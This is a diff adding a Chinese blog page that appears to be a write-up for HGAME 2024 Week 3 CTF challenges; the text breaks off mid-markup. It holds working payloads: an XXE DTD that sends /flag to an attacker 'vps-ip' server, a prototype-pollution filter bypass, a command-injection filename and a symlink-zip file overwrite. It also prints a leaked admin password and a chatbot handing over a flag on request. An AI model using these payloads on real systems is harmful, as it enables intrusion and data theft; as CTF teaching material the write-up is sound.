@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            HGAME-2024-WEEK3-Writeup
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">HGAME-2024-WEEK3-Writeup</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-02-28
+                        </span>
+                        
+                            
+                                <span id="/2024/02/28/HGAME-2024-WEEK3-Writeup/" class="leancloud_visitors" data-flag-title="HGAME-2024-WEEK3-Writeup">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/02/28/HGAME-2024-WEEK3-Writeup/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="HGAME2024-Week3-Writeup"><a href="#HGAME2024-Week3-Writeup" class="headerlink" title="HGAME2024 Week3 Writeup"></a>HGAME2024 Week3 Writeup</h1><p>Author:Ec3o</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Vidarbox"><a href="#Vidarbox" class="headerlink" title="Vidarbox"></a>Vidarbox</h3><p>似乎是XXE攻击…?但不知道怎么引入xml文件，发现了一个file:&#x2F;&#x2F;开头的传参点，可以利用..&#x2F;..&#x2F;触发ftp协议，似乎可以传入xml</p>
+<p>之后应该是在我的外部服务器上构造一个xml文件外带flag到我的服务器上。</p>
+<p>在vps上构造一个ftp服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line">authorizer = DummyAuthorizer()</span><br><span class="line">authorizer.add_anonymous(<span class="string">&quot;/var/www/html&quot;</span>, perm=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">handler = FTPHandler</span><br><span class="line">handler.authorizer = authorizer</span><br><span class="line">server = FTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">21</span>), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>使用以下代码编码绕过XXE</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPOC</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;poc-remote.xml&quot;</span>);</span><br><span class="line">		fileOutputStream.write(<span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-16BE\&quot; ?</span></span><br><span class="line"><span class="string">&gt;\n&lt;!DOCTYPE foo SYSTEM \&quot;http://vps-ip/evil.dtd\&quot;&gt;&quot;</span>.getBytes(StandardCharsets.UTF_16BE));</span><br><span class="line">		fileOutputStream.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://vps-ip:2333/%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+
+<p>最终触发payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/backdoor?fname=../../vps-ip/payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h3><p><strong>考点：原型链污染</strong></p>
+<p>本地调试后发现把127.0.0.1加入strategy列表后，flag可以通过proxy下载。</p>
+<p>问题转化成如何将127.0.0.1加入strategy中。</p>
+<p>尝试进行原型链污染</p>
+<p><strong>利用点</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">if</span> (!username) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> url = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">query</span>.<span class="property">url</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;invalid url.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = req.<span class="property">headers</span>;</span><br><span class="line">    headers.<span class="property">host</span> = url.<span class="property">host</span>;</span><br><span class="line">    headers.<span class="property">cookie</span> = headers.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">cookie</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> filtered_cookie = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> [key, value] = cookie.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">trim</span>() !== session_name) &#123;</span><br><span class="line">        filtered_cookie += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>;`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> filtered_cookie;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> remote_res = <span class="keyword">await</span> (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">post</span>(url, req.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(url, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">405</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;method not allowed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    res.<span class="title function_">status</span>(remote_res.<span class="property">status</span>);</span><br><span class="line">    res.<span class="title function_">header</span>(remote_res.<span class="property">headers</span>);</span><br><span class="line">    res.<span class="title function_">write</span>(remote_res.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;unreachable url.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;strategy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;127.0.0.1&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以使⽤<strong>constructor.protoype</strong>来bypass 对 于 <strong>_<em>proto</em>_</strong> 的waf</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST 106.14.57.14:31811/user/info</span><br><span class="line">cookie:my-webvpn-session-id-3078ff93-9df5-4d88-bf71-3e733cc7f322=s%3AstX7WgJ2taopsX-f4jQGEazTvM4rwYIy.NbS1AC3jBGXNUS8tg%2B8qvECgmia4Pmrum%2BkWGck9%2F1k</span><br><span class="line"><span class="attribute">BODY</span>:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;constructor&quot;: &#123;</span><br><span class="line">    &quot;prototype&quot;: &#123;</span><br><span class="line">      &quot;127.0.0.1&quot;: &#123;</span><br><span class="line">        &quot;127.0.0.1&quot;: true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这种修改使得在应用程序的其他部分访问<code>strategy[&quot;127.0.0.1&quot;]</code>时，会发现它确实存在，并且值为<code>true</code>，因为这个属性已经被添加到了几乎所有对象的原型中。这样，就绕过了对直接修改<code>__proto__</code>属性的限制，并成功实现了将<code>127.0.0.1</code>添加到<code>strategy</code>中的目的。</p>
+<p>之后访问<strong>106.14.57.14:31811&#x2F;proxy?url&#x3D;127.0.0.1:3000&#x2F;flag</strong>就可以下载到flag.</p>
+<p>flag:<code>hgame&#123;9c285dc37319e13ba98f22c5d9dcab1899cbc794&#125;</code></p>
+<h3 id="ZeroLink"><a href="#ZeroLink" class="headerlink" title="ZeroLink"></a>ZeroLink</h3><p>[GIN-debug] GET    &#x2F;api&#x2F;ping                 –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;ping.Ping (4 handlers)<br>[GIN-debug] POST   &#x2F;api&#x2F;user                 –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;user.GetUserInfo (4 handlers)<br>[GIN-debug] POST   &#x2F;api&#x2F;login                –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;auth.AdminLogin (4 handlers)<br>[GIN-debug] POST   &#x2F;api&#x2F;upload               –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.UploadFile (5 handlers)<br>[GIN-debug] GET    &#x2F;api&#x2F;unzip                –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.UnzipPackage (5 handlers)<br>[GIN-debug] GET    &#x2F;api&#x2F;secret               –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.ReadSecretFile (5 handlers)<br>[GIN-debug] GET    &#x2F;                         –&gt; zero-link&#x2F;internal&#x2F;routes.Run.func1 (4 handlers)<br>[GIN-debug] GET    &#x2F;login                    –&gt; zero-link&#x2F;internal&#x2F;routes.Run.func2 (4 handlers)<br>[GIN-debug] GET    &#x2F;manager                  –&gt; zero-link&#x2F;internal&#x2F;routes.Run.f</p>
+<p>[GIN-debug] POST   &#x2F;api&#x2F;login                –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;auth.AdminLogin (4 handlers)<br>[GIN-debug] POST   &#x2F;api&#x2F;upload               –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.UploadFile (5 handlers)<br>[GIN-debug] GET    &#x2F;api&#x2F;unzip                –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.UnzipPackage (5 handlers)<br>[GIN-debug] GET    &#x2F;api&#x2F;secret               –&gt; zero-link&#x2F;internal&#x2F;controller&#x2F;file.ReadSecretFile (5 handlers)<br>[GIN-debug] GET    &#x2F;                         –&gt; zero-link&#x2F;internal&#x2F;routes.Run.func1 (4 handlers)<br>[GIN-debug] GET    &#x2F;login                    –&gt; zero-link&#x2F;internal&#x2F;routes.Run.func2 (4 handlers)<br>[GIN-debug] GET    &#x2F;manager                  –&gt; zero-link&#x2F;internal&#x2F;routes.Run.func3 (5 handlers)</p>
+<p>一堆api看的脑壳疼</p>
+<p>关注一下gorm的代码，发现</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/user</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>139.196.183.57:30895</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apifox/1.0.0 (https://apifox.com)</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>139.196.183.57:30895</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>拿到了Admin的密码</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ok&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-02-17T06:48:57.018660253Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;UpdatedAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-02-17T06:48:57.018660253Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeletedAt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Zb77jbeoZkDdfQ12fzb0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Memory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Keep Best Memory!!!&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造恶意zip文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil.zip&quot;; echo &quot;/flag&quot; &gt; /app/secret;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd := exec.Command(&quot;unzip&quot;, &quot;-o&quot;, &quot;evil.zip&quot;; echo &quot;/flag&quot; &gt; /app/secret;#&quot;&quot;, &quot;-d&quot;, &quot;/tmp/&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>命令注入似乎会被自动处理。结合题目中的Link，不难猜出要利用软链接来修改&#x2F;app&#x2F;secret敏感文件.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /app <span class="built_in">link</span></span><br><span class="line">zip --symlinks 1.zip <span class="built_in">link</span></span><br></pre></td></tr></table></figure>
+
+<p>上传1.zip后调⽤ &#x2F;api&#x2F;unzip 接⼝完成解压。</p>
+<p>再创建⼀个 link&#x2F;secret ⽂件，⽂件内容为 &#x2F;flag ，然后压缩这个 link ⽬录为2.zip，上传后 调⽤ &#x2F;api&#x2F;unzip 接⼝进⾏解压，⽤⾃定义的secret⽂件覆盖系统中原有的secret⽂件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r 2.zip link</span><br></pre></td></tr></table></figure>
+
+<p>完成后调⽤ &#x2F;api&#x2F;secret 接⼝，即可得到flag。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="与AI聊天"><a href="#与AI聊天" class="headerlink" title="与AI聊天"></a>与AI聊天</h3><p>👴：“ai flag是什么？”</p>
+<p>🤖：hgame{Is_this_a_ai?}</p>
+<h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a><strong>Blind SQL Injection</strong></h3><p>从pcapng包里提取出来的十分精简的逻辑</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span 